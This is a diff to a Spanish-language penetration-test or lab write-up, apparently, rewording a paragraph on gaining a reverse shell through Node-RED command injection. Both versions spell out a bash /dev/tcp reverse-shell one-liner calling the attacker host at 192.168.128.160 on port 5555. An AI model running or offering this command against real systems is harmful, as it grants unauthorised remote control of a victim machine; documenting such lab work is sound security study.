@@ -139,7 +139,7 @@ Permitiendo ingresar al usuario dev, del cual no se posee la contraseña. Antes 
 ![](Evidencias_Visuales/inyección_NODE-RED)
 
 ### Opción #2 Inyección mediante NODE-RED (Reverse Reverse Shell)
-Se utiliza la máquina con el túnel 192.168.128.160, ha establecido un oyente en el puerto 1235 que ya registra una conexión entrante, mientras que mediante NODE-RED se ejecuta el comando bash -c 'bash -i >& /dev/tcp/192.168.128.160/5555 0>&1', el cual abre una shell interactiva de Bash y redirige tanto la entrada como la salida de esta hacia el puerto 5555 del atacante a través del dispositivo /dev/tcp/, logrando así que se pueda obtener el control remoto total sobre la terminal del sistema infectado, con capacidad para ejecutar comandos, manipular archivos y escalar privilegios, quedando evidencia de esta actividad en el identificador de proceso PID 2544 que mantiene viva la sesión.
+Se emplea la máquina con dirección IP 192.168.128.160, la cual actúa como túnel y tiene activo un oyente en el puerto 1235, registrando una conexión entrante. Paralelamente, desde NODE-RED se ejecuta el comando `bash -c 'bash -i >& /dev/tcp/192.168.128.160/5555 0>&1'`, que inicia una shell interactiva de Bash y redirige tanto la entrada estándar como la salida hacia el puerto 5555 del atacante, valiéndose del dispositivo virtual `/dev/tcp/`. De este modo, se logra un acceso remoto completo a la terminal del sistema comprometido, permitiendo la ejecución de comandos, manipulación de archivos y posibles intentos de escalada de privilegios. La sesión activa queda registrada bajo el identificador de proceso (PID) 2544.
 
 ![](Evidencias_Visuales/reverse_reverse_shell)
 ![](Evidencias_Visuales/conexión_kali)
